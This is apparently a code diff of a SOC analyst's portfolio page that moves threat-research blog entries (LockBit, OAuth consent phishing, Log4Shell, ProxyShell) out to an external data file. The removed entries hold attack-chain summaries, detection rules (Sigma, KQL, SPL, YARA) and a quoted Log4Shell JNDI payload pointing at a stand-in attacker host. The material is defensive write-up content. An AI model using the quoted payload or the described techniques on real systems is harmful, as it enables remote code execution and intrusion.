@@ -7,6 +7,10 @@
 <meta name="description" content="Swetha Devi — SOC Analyst & Threat Hunter. Threat research, attack chains, detection rules, IR playbooks.">
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<!-- Load the blog database BEFORE any scripts that use it -->
+<script src="blogs-database.js"></script>
+
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 :root{
@@ -671,88 +675,52 @@ const liveThreats=[
 })();
 
 /* ── BLOG DATA ── */
-const blogs=[
-  {id:'lockbit',cat:'Ransomware',title:'LockBit 3.0: Complete Attack Chain',date:'March 2025',excerpt:'Double extortion tactics, defense evasion via Terminator driver, and detection rules to catch LockBit affiliates in enterprise environments.',mitre:['T1562.001','T1021.002','T1486','T1070'],
-    content:`<h2>LockBit 3.0 Ransomware — Deep Dive</h2><p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;March 2025</p><hr><h3>Attack Chain</h3><p>Initial Access via RDP brute-force or phishing → Privilege Escalation using UAC bypass → Defense Evasion (Terminator driver kills EDR processes) → Lateral Movement via PsExec and WMI → Data Exfiltration using Mega/rclone → Encryption with .lockbit extension.</p><h3>MITRE ATT&CK Coverage</h3><div class="mitre-grid"><span class="mitre-tag">T1562.001 — Disable/Modify Tools</span><span class="mitre-tag">T1021.002 — SMB/Admin Shares</span><span class="mitre-tag">T1486 — Data Encrypted for Impact</span><span class="mitre-tag">T1070 — Indicator Removal</span><span class="mitre-tag">T1059 — Command & Scripting Interpreter</span></div><h3>Methodology & TTPs</h3><p>Adversary leverages living-off-the-land binaries: certutil, BITSAdmin, mshta.exe. Disables Windows Defender, SIEM agents, and backup services. Drops Terminator.sys (BYOVD) to kill EDR kernel callbacks. Uses LOTL for C2 communication.</p><h3>Impact</h3><p>Critical data leakage, prolonged operational downtime, multi-million dollar ransom demands targeting healthcare, finance, and energy sectors globally.</p><h3>Incident Response Actions</h3><p>Immediate containment: isolate affected hosts, revoke compromised credentials. Restore from immutable backups offline. Block IOCs (C2 domains, driver hashes), hunt for LOLBin anomalies, check scheduled tasks and services.</p><h3>Detection Rules</h3><pre>// Sigma — Suspicious BITSAdmin Transfer
-title: BITSAdmin Unusual File Transfer
-logsource:
-  product: windows
-  category: process_creation
-detection:
-  selection:
-    Image|endswith: '\\bitsadmin.exe'
-    CommandLine|contains: '/transfer'
-  condition: selection
-level: high
-
-// KQL — LSASS Dump Detection
-DeviceProcessEvents
-| where ProcessCommandLine contains "comsvcs.dll"
-  and ProcessCommandLine contains "MiniDump"
-| project Timestamp, DeviceName, AccountName, ProcessCommandLine
-
-// SPL — Terminator BYOVD Driver
-index=wineventlog EventCode=7045
-| eval svc=lower(ServiceName)
-| where svc="zamguard64" OR svc="zam64"</pre>`},
-  {id:'oauth',cat:'Cloud / Identity',title:'OAuth Consent Phishing (APT29 Style)',date:'February 2025',excerpt:'Abusing OAuth apps for token theft, MFA bypass via device code flow, detection queries, and incident response steps.',mitre:['T1550.001','T1111','T1114'],
-    content:`<h2>OAuth Consent Phishing — APT29 Technique</h2><p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;February 2025</p><hr><h3>Attack Chain</h3><p>Spear-phishing link → rogue OAuth app consent granted by victim → access token + refresh token theft → persistent mailbox access → forwarding rules created → data exfiltrated from SharePoint/OneDrive.</p><h3>MITRE ATT&CK Coverage</h3><div class="mitre-grid"><span class="mitre-tag">T1550.001 — Application Access Token</span><span class="mitre-tag">T1111 — MFA Interception</span><span class="mitre-tag">T1114.002 — Remote Email Collection</span><span class="mitre-tag">T1098.003 — Additional Cloud Credentials</span></div><h3>Methodology</h3><p>Threat actor uses device code flow phishing, mimicking legitimate Microsoft login. Bypasses MFA entirely by stealing already-authenticated refresh tokens. Registers persistent application in victim's Azure AD tenant.</p><h3>Impact</h3><p>Full cloud mailbox compromise, stealthy persistence without password reset, data exfiltration from SharePoint and OneDrive without triggering DLP policies.</p><h3>Response Actions</h3><p>Revoke all malicious OAuth grants via Entra portal. Enforce Conditional Access: block legacy auth, require compliant devices. Implement FIDO2 hardware keys. Audit enterprise application permissions quarterly.</p><h3>Detection Queries</h3><pre>// KQL — Unusual OAuth Consent (Sentinel/Defender)
-AADSignInEventsBeta
-| where ConsentProvidedForApp == true
-| where AppDisplayName !in (known_apps_allowlist)
-| where IPAddress !in (corporate_ips)
-| project Timestamp, UserPrincipalName, AppDisplayName, IPAddress, Location
-| order by Timestamp desc
-
-// KQL — Inbox Rule Created by Non-Owner
-OfficeActivity
-| where Operation == "New-InboxRule"
-| where UserId != MailboxOwnerUPN
-| project TimeGenerated, UserId, Parameters</pre>`},
-  {id:'log4shell',cat:'CVE / RCE',title:'Log4Shell (CVE-2021-44228) Methodology & IR',date:'January 2025',excerpt:'JNDI injection deep-dive, post-exploitation techniques, YARA rules, and a full containment playbook for security teams.',mitre:['T1190','T1059','T1105'],
-    content:`<h2>Log4Shell — JNDI Injection & Full Exploitation Chain</h2><p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;January 2025</p><hr><h3>Attack Chain</h3><p>Adversary injects <code style="background:rgba(0,255,229,0.07);padding:2px 6px;border-radius:4px;font-family:var(--mono);font-size:11px">\${jndi:ldap://attacker.com/x}</code> into HTTP headers. Vulnerable log4j2 performs remote lookup → LDAP redirects to attacker RMI server → remote class loading → RCE on target JVM.</p><h3>MITRE ATT&CK Coverage</h3><div class="mitre-grid"><span class="mitre-tag">T1190 — Exploit Public-Facing Application</span><span class="mitre-tag">T1059.007 — JavaScript/JScript</span><span class="mitre-tag">T1105 — Ingress Tool Transfer</span><span class="mitre-tag">T1071 — Application Layer Protocol</span></div><h3>Post-Exploitation</h3><p>Crypto miner deployment, reverse shell via Netcat/Cobalt Strike beacon, pivoting to internal cloud metadata service, credential harvesting from JVM heap dumps.</p><h3>Response Actions</h3><p>Patch to log4j2 ≥2.17.1 immediately. Interim: set -Dlog4j2.formatMsgNoLookups=true. Remove JndiLookup.class from jar files. Deploy WAF rule blocking \${jndi: patterns.</p><h3>Detection Rules</h3><pre># YARA — Log4Shell Exploitation Attempt
-rule Log4j_JNDI_Exploit {
-  meta:
-    description = "Detects Log4Shell exploitation in HTTP logs"
-    severity = "CRITICAL"
-  strings:
-    $a = /\$\{jndi:(ldap|rmi|dns|iiop|corba|nds):\/\// nocase
-    $b = "\${lower:" nocase
-    $c = "\${upper:" nocase
-  condition:
-    $a or ($b and $c)
-}</pre>`},
-  {id:'proxyshell',cat:'Exchange / RCE',title:'ProxyShell: Exchange Pre-Auth RCE Chain',date:'December 2024',excerpt:'SSRF to PowerShell remoting to webshell deployment — detection rules and hardening for Microsoft Exchange.',mitre:['T1190','T1059.001','T1505.003'],
-    content:`<h2>ProxyShell — Microsoft Exchange RCE Chain</h2><p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;December 2024</p><hr><h3>CVE Chain</h3><p>CVE-2021-34473 (SSRF / auth bypass) → CVE-2021-34523 (PowerShell remoting privilege escalation) → CVE-2021-31207 (write arbitrary webshell via mailbox export).</p><h3>MITRE ATT&CK Coverage</h3><div class="mitre-grid"><span class="mitre-tag">T1190 — Exploit Public-Facing App</span><span class="mitre-tag">T1059.001 — PowerShell</span><span class="mitre-tag">T1505.003 — Web Shell</span><span class="mitre-tag">T1021.006 — WinRM</span></div><h3>Methodology</h3><p>Attacker sends malicious POST to autodiscover endpoint to bypass auth. Uses Exchange Management PowerShell to schedule mailbox export to .aspx path, deploying a webshell in /aspnet_client/.</p><h3>Impact</h3><p>Full Exchange server compromise, persistent webshell access, mailbox data theft, lateral movement to domain controllers. Widely exploited by ransomware groups and nation-state actors.</p><h3>Response Actions</h3><p>Apply Exchange CU immediately. Remove .asp/.aspx/.ashx files from /aspnet_client/ and /OWA/ directories. Reset IIS app pools. Audit New-MailboxExportRequest logs.</p><h3>Detection Rules</h3><pre>// Sigma — ProxyShell Autodiscover Abuse
-title: ProxyShell Exploitation Attempt
-logsource:
-  product: iis
-detection:
-  selection:
-    cs-method: POST
-    cs-uri-stem|contains:
-      - '/autodiscover/autodiscover.json'
-    cs-uri-query|contains: '@'
-  condition: selection
-level: critical</pre>`}
-];
-
-function buildBlogs(data,limit){
-  const grid=document.getElementById('blogGrid');
-  if(!grid)return;
-  grid.innerHTML='';
-  const list=limit?data.slice(0,limit):data;
-  list.forEach((b,i)=>{
-    const card=document.createElement('div');
-    card.className='blog-card reveal';
-    card.style.transitionDelay=(i*.1)+'s';
-    card.innerHTML=`<div class="blog-cat"><i class="fas fa-bug" style="font-size:10px"></i>${b.cat}</div><div class="blog-title">${b.title}</div><div class="blog-meta"><i class="far fa-calendar-alt"></i> ${b.date}</div><div class="blog-excerpt">${b.excerpt}</div><div class="blog-footer"><span class="blog-read">Read Analysis <i class="fas fa-arrow-right"></i></span><div class="blog-tags">${b.mitre.map(m=>`<span class="blog-tag">${m}</span>`).join('')}</div></div>`;
-    card.addEventListener('click',()=>openModal(b));
-    grid.appendChild(card);
-    setTimeout(()=>card.classList.add('visible'),50+i*100);
-  });
+/* ── BLOG DATA FROM CENTRAL DATABASE ── */
+function buildBlogsFromDatabase(limit = 3) {
+    const grid = document.getElementById('blogGrid');
+    if (!grid) return;
+    
+    // Get latest blogs from the central database
+    const latestBlogs = getLatestBlogs(limit);
+    
+    grid.innerHTML = '';
+    
+    latestBlogs.forEach((b, i) => {
+        const card = document.createElement('div');
+        card.className = 'blog-card reveal';
+        card.style.transitionDelay = (i * .1) + 's';
+        
+        card.innerHTML = `
+            <div class="blog-cat"><i class="${b.icon}" style="font-size:10px"></i>${b.catLabel}</div>
+            <div class="blog-title">${b.title}</div>
+            <div class="blog-meta"><i class="far fa-calendar-alt"></i> ${b.date}</div>
+            <div class="blog-excerpt">${b.excerpt}</div>
+            <div class="blog-footer">
+                <span class="blog-read">Read Analysis <i class="fas fa-arrow-right"></i></span>
+                <div class="blog-tags">${b.mitre.slice(0, 3).map(m => `<span class="blog-tag">${m}</span>`).join('')}</div>
+            </div>
+        `;
+        
+        card.addEventListener('click', () => {
+            window.location.href = `research.html#${b.id}`;
+        });
+        
+        grid.appendChild(card);
+        setTimeout(() => card.classList.add('visible'), 50 + i * 100);
+    });
 }
-buildBlogs(blogs,3);
+
+// Call the function
+buildBlogsFromDatabase(3);
+
+// Update stats count
+document.addEventListener('DOMContentLoaded', () => {
+    const blogCountElement = document.querySelector('[data-count="4"]');
+    if (blogCountElement && typeof getAllBlogs === 'function') {
+        const totalBlogs = getAllBlogs().length;
+        blogCountElement.setAttribute('data-count', totalBlogs);
+    }
+});
 
 /* ── MODAL ── */
 const modal=document.getElementById('modal');
